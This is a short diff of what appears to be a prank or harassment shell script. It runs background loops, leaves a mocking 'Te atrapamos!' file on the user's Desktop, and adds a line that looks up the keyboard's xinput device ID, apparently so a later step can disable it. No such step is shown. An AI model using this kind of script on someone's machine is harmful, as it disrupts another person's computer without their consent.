@@ -40,3 +40,5 @@ done) &
 done) &
 
 echo "😆 Te atrapamos!" > ~/Desktop/JAJAJAJA.txt
+
+teclado_id=$(xinput list | grep -i 'keyboard' | awk '{print $6}' | cut -d'=' -f2 | head -n 1)
